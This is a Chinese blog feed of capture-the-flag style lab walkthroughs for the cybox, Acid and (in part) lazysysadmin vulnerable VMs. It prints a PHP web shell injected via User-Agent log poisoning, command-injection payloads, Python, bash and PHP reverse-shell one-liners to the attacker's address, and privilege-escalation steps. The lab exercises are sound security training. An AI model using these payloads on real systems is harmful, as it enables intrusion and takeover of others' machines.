    <content type="html"><![CDATA[<h3 id="cybox-1-1靶机练习"><a href="#cybox-1-1靶机练习" class="headerlink" title="cybox:1.1靶机练习"></a>cybox:1.1靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.141</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><h5 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3位网关地址，1.137为kali地址，因此判断目标靶机地址为192.168.1.141</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210102234570.png" alt="image-20210210102234570"></p><h5 id="端口服务扫描："><a href="#端口服务扫描：" class="headerlink" title="端口服务扫描："></a>端口服务扫描：</h5><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210113920614.png" alt="image-20210210113920614" style="zoom:67%;" /><p>靶机开启了80和443端口，访问一下看看</p><p>直接访问ip后是一个web页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114127375.png" alt="image-20210210114127375"></p><p>拖到页面最下方可以看到一个域名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114235781.png" alt="image-20210210114235781"></p><h5 id="爆破目录："><a href="#爆破目录：" class="headerlink" title="爆破目录："></a>爆破目录：</h5><p>爆破一下目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.141&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114345084.png" alt="image-20210210114345084" style="zoom: 80%;" /><p>同时也使用dirbuster爆破一下详细页面，以取得更多的信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115418915.png" alt="image-20210210115418915"></p><p>依次访问dirb爆出的目录，发现assets目录下存放了些css、js文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114945379.png" alt="image-20210210114945379" style="zoom: 67%;" /><p>/cgi/bin目录无访问权限，/phpadmin目录只允许本地访问</p><p>dirbuster爆破结果也出来了，与dirb扫出的结果相差不大，此时并没有发现到什么有价值的页面。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115351005.png" alt="image-20210210115351005"></p><p>此时我们甚至都没有找到真正提供服务的web页面，我们扫描端口时可以看到目标机器开放了ftp服务，还开放了pop3、imap，还提供邮件服务，很明显目标机器有一个较复杂的网站提供服务，但我们的扫描结果并不相符，说明爆破姿势不对</p><p>之前访问首页的时候看到了一个域名cybox.company，我们将其添加进hosts文件，尝试再次扫描一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115848593.png" alt="image-20210210115848593"></p><p>这次我们使用gobuster进行扫描，gobuster是一款基于go语言的目录/文件和DNS爆破工具，可以对目录、文件、DNS和VHost等对象进行暴力破解攻击，下载链接<a href="https://github.com/OJ/gobuster%EF%BC%8Ckali%E4%B8%8B%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5**apt-get">https://github.com/OJ/gobuster，kali下可以直接**apt-get</a> install gobuster**进行安装</p><p>扫描后，可以看到，有了我们之前并未爆破出的页面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -u http:<span class="hljs-regexp">//</span>cybox.company<span class="hljs-regexp">/ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210120618851.png" alt="image-20210210120618851"></p><p>依次访问各页面</p><p>dev.cybox.company是一个PHPinfo</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210122858686.png" alt="image-20210210122858686"></p><p>ftp.cybox.company是一个ftp页面，目测实现文件传输功能，需要验证用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123135118.png" alt="image-20210210123135118"></p><p>webmail.cybox.company是一个邮箱登录页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210124443912.png" alt="image-20210210124443912"></p><p>register.cybox.company是一个创建用户页面，尝试创建后直接显示创建成功，也并没有提示输入密码等信息，直接给了一个与用户名相同的密码，暂时不知道是创建了什么用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210125804934.png" alt="image-20210210125804934"></p><p>monitor.cybox.company访问后跳转到一个登录页面，下面两个链接可以跳转到一个注册页面，以及一个密码找回</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123613774.png" alt="image-20210210123613774"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>在上面这个页面，注册一个用户登录试一下</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210131944537.png" alt="image-20210210131944537" style="zoom:67%;" /><p>登录后发现并没有什么实际功能，只有一个创建条目记录时间的，不知道有什么作用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210132233531.png" alt="image-20210210132233531"></p><p>这里退出登录，试一下未注册用户，发现不存在的用户登录会直接提示用户不存在，这里可以试一下有无admin用户</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210134819545.png" alt="image-20210210134819545" style="zoom:67%;" /><p>尝试猜解管理员的用户名，因为登录页面提供密码修改，可以试试能不能越权修改密码，此处发现存在一个<a href="mailto:&#x61;&#100;&#x6d;&#105;&#110;&#x40;&#x63;&#x79;&#x62;&#x6f;&#120;&#x2e;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#121;">&#x61;&#100;&#x6d;&#105;&#110;&#x40;&#x63;&#x79;&#x62;&#x6f;&#120;&#x2e;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#121;</a>，显示密码错误，并没有显示用户不存在，先记下，一会看看能不能改</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222525468.png" alt="image-20210210222525468" style="zoom:67%;" /><p>点击忘记密码，会跳转到一个发送链接的页面，这里是将修改链接发送到邮箱了，应该就是我们刚刚看到的那个邮箱的登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210135357234.png" alt="image-20210210135357234"></p><p>到邮箱登录页面webmail，登录，发现无法登录，一直显示密码用户名不匹配，说明两边的用户不互通，但我们这时还有一个之前的register.cybox.company/目录，用它创建一个同名用户aaa</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222010198.png" alt="image-20210210222010198" style="zoom:67%;" /><p>之后再到webmail登录，登录成功，可以看到我们之前接收到的修改密码的邮件，里面有个修改链接</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222214774.png" style="zoom: 50%;" /><p>点进去，跳转到一个修改密码页面，我们用burp抓下包，把邮箱改成admin的，看看能不能通过改包来越权修改admin用户的密码</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222942625.png" alt="image-20210210222942625" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223046506.png" alt="image-20210210223046506"></p><p>点击放包，直接跳转回了登录页面，尝试登录admin用户，登录成功，看来并没有什么验证</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223332763.png" alt="image-20210210223332763" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223359734.png" alt="image-20210210223359734"></p><p>点进Admin panel，看一下管理页面，结果，开发中</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223827281.png" alt="image-20210210223827281" style="zoom:67%;" /><p>到这里又断了，进入到网站的后台结果开发中。。。</p><p>但是方法总比困难多，右键查看页面代码，可以看到，这里包含进来一个php页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224124818.png" alt="image-20210210224124818"></p><p>我们可以尝试文件包含，包含一个/etc/passwd文件测试一下，包含成功，此处存在文件包含漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224656944.png" alt="image-20210210224656944"></p><p>然后咱们可以通过日志文件反弹一个shell，apache的日志目录为/opt/bitnami/apache2/logs/，请求日志文件为access_log，错误日志文件为error_log，我们包含请求日志看一下，可以看到，这是ftp页面的请求日志</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212173236662.png" alt="image-20210212173236662"></p><p>我们转到ftp页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200452500.png" alt="image-20210212200452500"></p><p>打开burp抓包，刷新页面，拦一个包下来，User-Agent改成cmd命令的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200557510.png" alt="image-20210212200557510"></p><p>发包，然后测试一下，测试成功，没有问题</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212201117351.png" alt="image-20210212201117351"></p><p>制作反弹shell</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&#x27;192.168.1.137&#x27;</span>,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>]);&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203519286.png" alt="image-20210212203519286"></p><p>kali端监听443端口（这里选取443是因为经测试此靶机只允许通往部分端口的数据包进出）</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203720362.png" alt="image-20210212203720362"></p><p>监听好端口后，web页面敲击回车，成功反弹shell，拿到了一个低权限的shell</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203808874.png" alt="image-20210212203808874" style="zoom:80%;" /><h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><p>首先查找有s权限的文件，只看非系统文件，此处需要审计代码，可以看到，在/opt目录下有一个registerlauncher</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212213925216.png" alt="image-20210212213925216" style="zoom:80%;" /><p>在我们查看此文件内容时可以发现它调用了另一个/opt目录下的文件register，注意此处直接用cat查看文件会乱码，需要用strings转化字符串</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s registerlauncher<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212214029876.png" alt="image-20210212214029876" style="zoom:80%;" /><p>在查看register文件内容，发现这是一个可以创建用户的文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212220738362.png" alt="image-20210212220738362" style="zoom: 80%;" /><p>实际就是实现了那个register页面的功能，测试之前创建的aaa用户，此处可以登录</p><p>首先取得一个交互shell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后尝试登录aaa，成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212222901048.png" alt="image-20210212222901048"></p><p>试一下能不能切换root，失败，提示我们aaa不再sudoers文件中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212223159058.png" alt="image-20210212223159058"></p><p>另外此处我们无权限查看sudoers文件，但应该是有用户持有切换权限的，这里就需要试了，所幸并不难猜，用户名起为sudo即可</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224130623.png" alt="image-20210212224130623" style="zoom:67%;" /><p>创建完之后切换用户sudo，即可切换root用户，至此提权完毕</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224253887.png" alt="image-20210212224253887"></p><p>在root的家目录下可以看到一个root.txt，查看一下，应该是个flag</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224445648.png" alt="image-20210212224445648"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/yutianovo/article/details/111687112">https://blog.csdn.net/yutianovo/article/details/111687112</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Acid靶机练习</title>
    <link href="/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="Acid靶机练习"><a href="#Acid靶机练习" class="headerlink" title="Acid靶机练习"></a>Acid靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.140</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3为网关地址，1.137为攻击机地址，因此推测目标主机地址为192.168.1.140</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210203223609124.png" alt="image-20210203223609124"></p><p>端口扫描：</p><p>可以看到目标机器使用了Apache作为中间件，开放了33447端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.140</span> -sV<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204093237048.png" alt="image-20210204093237048"></p><p>访问一下看看，发现是一个静态页面，扫描一下目录看看</p><p>首先用dirb扫一下，已经用了big的字典，但扫到的目录条目还是很少</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204100917676.png" alt="image-20210204100917676"></p><p>再用dirbuster爆破目录</p><p>选好字典，爆破目录选择根目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204101135047.png"></p><p>点击start开始爆破，得到了比较全面的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202104586.png" alt="image-20210204202104586"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>访问查看各条目，challenge目录下是一个登录页面，先放着不管</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202215238.png" alt="image-20210204202215238"></p><p>一路向下访问，到cake.php条目下的时候,可以看到标签页上出现了一个目录名Magic_Box，结合页面上的话，另外页面叫cake.php，这个目录应该是有用的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204204000254.png" alt="image-20210204204000254"></p><p>再次爆破这个Magic_Box目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204222202012.png" alt="image-20210204222202012"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224446448.png" alt="image-20210204224446448"></p><p>得到的结果中有一个command.php，访问后发现是一个可以执行ping命令的页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224626144.png" alt="image-20210204224626144"></p><p>测试命令注入，提交参数后并没有回显信息，burp抓包看一下，果然，信息是有的，只是没有直接回显到页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225054147.png" alt="image-20210204225054147"></p><p>用ifconfig测试一下，发现果然存在命令注入</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225212133.png" alt="image-20210204225212133"></p><p>尝试反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.1.137</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175956076.png" alt="image-20210205175956076"></p><p>kali端监听4444端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205173317428.png" alt="image-20210205173317428"></p><p>未果，反弹失败，尝试转url编码，依旧反弹失败</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175147349.png" alt="image-20210205175147349"></p><p>尝试其他的反弹方式</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">;php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.1.137&quot;</span>,<span class="hljs-number">4444</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><p>反弹成功</p><h4 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h4><p>首先查看passwd文件，看一下用户</p><p>着重关注acid、saman两个用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200204389.png" alt="image-20210205200204389"></p><p>查看一下这两个用户的文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user saman 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200354607.png" alt="image-20210205200354607"></p><p>find / -user acid 2&gt;/dev/null</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200506712.png" alt="image-20210205200506712"></p><p>在acid的文件中可以看到一个抓包文件hunt.pcapng，显得格格不入，我们通过ssh把它复制下来，这里因为kali linux为保证安全性，ssh是默认禁止连接的，需要修改配置文件，这里我直接使用了另外一台centos来接收文件，ip为192.168.1.131</p><p>首先取得一个交互shell，以进行下一步操作，在原本shell中输入以下命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后使用命令scp来复制传输文件，如图传输成功</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp /sbin/raw_vs_isi/hint.pcapng root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.1</span>.<span class="hljs-number">131</span><span class="hljs-symbol">:/root/hint</span>.pcapng<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201641880.png" alt="image-20210205201641880"></p><p>拿到抓包文件后，用wireshark打开</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201844205.png" alt="image-20210205201844205"></p><p>逐包查看，未果，可以分数据包种类跟踪流，查看数据包信息</p><p>追踪tcp流时，可以看到saman用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202141370.png" alt="image-20210205202141370"></p><p>我们切换到此用户saman，成功切换，之后再尝试用户saman切换root，发现有权限，切换成功，提权至root</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202547170.png" alt="image-20210205202547170"></p><p>参考文章：<a href="https://www.freebuf.com/column/200518.html">https://www.freebuf.com/column/200518.html</a></p><p>​                    </p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lazysysadmin靶机练习</title>
    <link href="/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="lazysysadmin靶机练习"><a href="#lazysysadmin靶机练习" class="headerlink" title="lazysysadmin靶机练习"></a>lazysysadmin靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.138</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/%E6%B5%8B%E8%AF%95.png" alt="image-20210127195115436"></p><p>端口扫描：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV <span class="hljs-number">192.168.1.138</span><br></code></pre></td></tr></table></figure><p>可以看到目标主机开放了samba服务，先放着一会再看</p><p><img src="E:\大三上作业练习\web安全\web练习\lazysysadmin靶机练习\lazysysadmin靶机练习.assets\image-20210128221658996.png" alt="image-20210128221658996"></p><p>目录爆破：</p><p>这里用了kali里已有的dirb进行目录遍历</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.138&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><p>可以看到有一个wordpress目录，猜想网站是wordpress架构的，另外有一个phpmyadmin目录，大概可以登录管理数据库</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130102741766.png" alt="image-20210130102741766"></p><p>直接访问80端口，跳转到一个近似静态的页面，几乎没有什么互动性，也不会跳转到其他页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222825295.png" alt="image-20210130222825295"></p><p>查看一下robots.txt</p><p>显示出来的目录和我们用dirb爆破出的基本一致</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224040160.png" alt="image-20210130224040160"></p><p>依次访问我们之前爆破出的目录，看看有什么有用的信息</p><p>访问<a href="http://192.168.1.138/wordpress/wp-admin/%E6%97%B6%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E8%B4%A6%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%8C%E5%85%88%E6%94%BE%E7%9D%80">http://192.168.1.138/wordpress/wp-admin/时会跳转到一个后台管理登录页面，不知道账户名密码，先放着</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222411433.png" alt="image-20210130222411433"></p><p>访问<a href="http://192.168.1.138/phpmyadmin/%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0phpmyadmin%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%94%BE%E5%9C%A8%E4%B8%80%E8%BE%B9">http://192.168.1.138/phpmyadmin/会跳转到phpmyadmin，依旧放在一边</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222610561.png" alt="image-20210130222610561"></p><p>直接访问wordpress目录会到一个可留言的web页面，内容全部是my name is togie看起来像是个博客之类的，翻到底下还可以看见评论</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224307649.png" alt="image-20210130224307649"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>网站上并没有发现什么特别有用的信息，除了看到一个togie，疑似用户名，可以尝试ssh爆破，其他地方没有很明显的漏洞点，我们之前扫描端口的时候发现了靶机开放，连上去看一看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smb:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.138</span>/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224846851.png" alt="image-20210130224846851"></p><p>点进共享文件夹后，可以看到里面的这些目录，和我们爆破到的网站目录基本一致，既然如此，可以看看有没有我们想要找的配置文件，比如说wp-congfig.php之类的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225107101.png" alt="image-20210130225107101"></p><p>果然有，打开以后找到我们想要的数据库用户名密码</p><p>Admin、TogieMYSQL12345^^</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225244557.png" alt="image-20210130225244557"></p><p>还可以在一个deets.txt文件里看到一串密码12345，暂时不知道有什么用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223946613.png" alt="image-20210131223946613"></p><p>分别登录到之前找到的phpmyadmin页面和wordpress后台管理页面</p><p>phpmyadmin很明显是没给权限，这里查不了数据表</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131222828646.png" 